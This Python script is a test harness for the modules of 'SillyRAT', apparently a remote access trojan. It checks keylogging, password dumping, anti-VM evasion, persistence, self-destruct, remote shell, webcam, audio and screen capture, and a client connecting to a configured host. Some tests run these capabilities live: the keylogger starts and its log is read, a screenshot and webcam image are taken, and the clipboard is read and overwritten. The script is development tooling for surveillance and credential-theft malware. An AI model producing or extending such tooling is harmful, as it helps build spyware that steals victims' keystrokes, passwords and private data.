#!/usr/bin/env python3
"""
Test Script for SillyRAT Mods Functions
This script tests all the modules and functions available in the SillyRAT project
"""

import sys
import os
import time
import threading
from datetime import datetime
from mods.imports import *
from mods.consts import *

# Add mods directory to path
sys.path.append(os.path.join(os.path.dirname(__file__), 'mods'))

def test_sysinfo():
    """Test system information module"""
    print("\n=== Testing SYSINFO Module ===")
    try:
        from sysinfo import SYSINFO
        sysinfo = SYSINFO()
        data = sysinfo.get_data()
        print("✓ SYSINFO module loaded successfully")
        print(f"Data length: {len(data)} characters")
        return True
    except Exception as e:
        print(f"✗ SYSINFO module failed: {e}")
        return False

def test_screenshot():
    """Test screenshot module"""
    print("\n=== Testing Screenshot Module ===")
    try:
        from mods.screenshot import SCREENSHOT
        screenshot = SCREENSHOT()
        data = screenshot.get_data()
        if data:
            print("✓ Screenshot captured successfully")
            print(f"Screenshot size: {len(data)} bytes")
        else:
            print("✗ Screenshot capture failed")
        return data is not None
    except Exception as e:
        print(f"✗ Screenshot module failed: {e}")
        return False

def test_keylogger():
    """Test keylogger module"""
    print("\n=== Testing Keylogger Module ===")
    try:
        from keylogger import Keylogger
        keylogger = Keylogger()
        print("✓ Keylogger module loaded successfully")
        
        # Test starting keylogger
        keylogger.start()
        print("✓ Keylogger started")
        
        # Wait a moment and check log
        time.sleep(2)
        log = keylogger.get_log()
        print(f"✓ Keylogger log retrieved (length: {len(log)})")
        return True
    except Exception as e:
        print(f"✗ Keylogger module failed: {e}")
        return False

def test_clipboard():
    """Test clipboard module"""
    print("\n=== Testing Clipboard Module ===")
    try:
        from clipboard import ClipboardManager
        
        # Test getting clipboard
        clipboard_data = ClipboardManager.get_clipboard()
        print("✓ Clipboard read test completed")
        print(f"Clipboard content length: {len(clipboard_data)}")
        
        # Test setting clipboard
        test_data = f"Test clipboard data - {datetime.now()}"
        result = ClipboardManager.set_clipboard(test_data)
        print(f"✓ Clipboard write test: {result}")
        
        return True
    except Exception as e:
        print(f"✗ Clipboard module failed: {e}")
        return False

def test_webcam():
    """Test webcam module"""
    print("\n=== Testing Webcam Module ===")
    try:
        from webcam import Webcam
        webcam = Webcam()
        data = webcam.capture()
        
        if isinstance(data, bytes):
            print("✓ Webcam capture successful")
            print(f"Image size: {len(data)} bytes")
        else:
            print(f"✓ Webcam test completed: {data}")
        
        return True
    except Exception as e:
        print(f"✗ Webcam module failed: {e}")
        return False

def test_audio_capture():
    """Test audio capture module"""
    print("\n=== Testing Audio Capture Module ===")
    try:
        from audio_capture import AudioCapture
        audio = AudioCapture()
        print("✓ Audio capture module loaded successfully")
        return True
    except Exception as e:
        print(f"✗ Audio capture module failed: {e}")
        return False

def test_file_transfer():
    """Test file transfer module"""
    print("\n=== Testing File Transfer Module ===")
    try:
        from file_transfer import FileTransfer
        file_transfer = FileTransfer()
        print("✓ File transfer module loaded successfully")
        return True
    except Exception as e:
        print(f"✗ File transfer module failed: {e}")
        return False

def test_persistence():
    """Test persistence module"""
    print("\n=== Testing Persistence Module ===")
    try:
        from persistence import Persistence
        persistence = Persistence()
        print("✓ Persistence module loaded successfully")
        return True
    except Exception as e:
        print(f"✗ Persistence module failed: {e}")
        return False

def test_task_scheduler():
    """Test task scheduler module"""
    print("\n=== Testing Task Scheduler Module ===")
    try:
        from task_scheduler import TaskScheduler
        scheduler = TaskScheduler()
        print("✓ Task scheduler module loaded successfully")
        return True
    except Exception as e:
        print(f"✗ Task scheduler module failed: {e}")
        return False

def test_plugin_loader():
    """Test plugin loader module"""
    print("\n=== Testing Plugin Loader Module ===")
    try:
        from plugin_loader import PluginLoader
        loader = PluginLoader()
        print("✓ Plugin loader module loaded successfully")
        return True
    except Exception as e:
        print(f"✗ Plugin loader module failed: {e}")
        return False

def test_screenshare():
    """Test screenshare module"""
    print("\n=== Testing Screenshare Module ===")
    try:
        from screenshare import ScreenShare
        screenshare = ScreenShare()
        print("✓ Screenshare module loaded successfully")
        return True
    except Exception as e:
        print(f"✗ Screenshare module failed: {e}")
        return False

def test_self_destruct():
    """Test self destruct module"""
    print("\n=== Testing Self Destruct Module ===")
    try:
        from self_destruct import SelfDestruct
        self_destruct = SelfDestruct()
        print("✓ Self destruct module loaded successfully")
        return True
    except Exception as e:
        print(f"✗ Self destruct module failed: {e}")
        return False

def test_password_dumper():
    """Test password dumper module"""
    print("\n=== Testing Password Dumper Module ===")
    try:
        from password_dumper import PasswordDumper
        dumper = PasswordDumper()
        print("✓ Password dumper module loaded successfully")
        return True
    except Exception as e:
        print(f"✗ Password dumper module failed: {e}")
        return False

def test_antivm():
    """Test antivm module"""
    print("\n=== Testing AntiVM Module ===")
    try:
        from antivm import AntiVM
        antivm = AntiVM()
        print("✓ AntiVM module loaded successfully")
        return True
    except Exception as e:
        print(f"✗ AntiVM module failed: {e}")
        return False

def test_shell():
    """Test shell module"""
    print("\n=== Testing Shell Module ===")
    try:
        from shell import ShellExecutor
        shell = ShellExecutor()
        print("✓ Shell module loaded successfully")
        return True
    except Exception as e:
        print(f"✗ Shell module failed: {e}")
        return False

def test_client():
    """Test client module"""
    print("\n=== Testing Client Module ===")
    try:
        from client import CLIENT
        from consts import CONSTIP, CONSTPT
        
        client = CLIENT(CONSTIP, CONSTPT)
        print("✓ Client module loaded successfully")
        print(f"Client configured for {CONSTIP}:{CONSTPT}")
        return True
    except Exception as e:
        print(f"✗ Client module failed: {e}")
        return False

def test_imports():
    """Test imports module"""
    print("\n=== Testing Imports Module ===")
    try:

        print("✓ Imports module loaded successfully")
        return True
    except Exception as e:
        print(f"✗ Imports module failed: {e}")
        return False

def run_all_tests():
    """Run all module tests"""
    print("🚀 Starting SillyRAT Mods Test Suite")
    print("=" * 50)
    
    test_results = {}
    
    # List of all test functions
    tests = [
        ("SYSINFO", test_sysinfo),
        ("Screenshot", test_screenshot),
        ("Keylogger", test_keylogger),
        ("Clipboard", test_clipboard),
        ("Webcam", test_webcam),
        ("Audio Capture", test_audio_capture),
        ("File Transfer", test_file_transfer),
        ("Persistence", test_persistence),
        ("Task Scheduler", test_task_scheduler),
        ("Plugin Loader", test_plugin_loader),
        ("Screenshare", test_screenshare),
        ("Self Destruct", test_self_destruct),
        ("Password Dumper", test_password_dumper),
        ("AntiVM", test_antivm),
        ("Shell", test_shell),
        ("Client", test_client),
        ("Imports", test_imports),
    ]
    
    # Run all tests
    for test_name, test_func in tests:
        try:
            result = test_func()
            test_results[test_name] = result
        except Exception as e:
            print(f"✗ {test_name} test crashed: {e}")
            test_results[test_name] = False
    
    # Print summary
    print("\n" + "=" * 50)
    print("📊 TEST RESULTS SUMMARY")
    print("=" * 50)
    
    passed = 0
    total = len(test_results)
    
    for test_name, result in test_results.items():
        status = "✓ PASS" if result else "✗ FAIL"
        print(f"{test_name:<20} {status}")
        if result:
            passed += 1
    
    print("-" * 50)
    print(f"Total Tests: {total}")
    print(f"Passed: {passed}")
    print(f"Failed: {total - passed}")
    print(f"Success Rate: {(passed/total)*100:.1f}%")
    
    if passed == total:
        print("\n🎉 All tests passed!")
    else:
        print(f"\n⚠️  {total - passed} test(s) failed")
    
    return test_results

if __name__ == "__main__":
    run_all_tests() 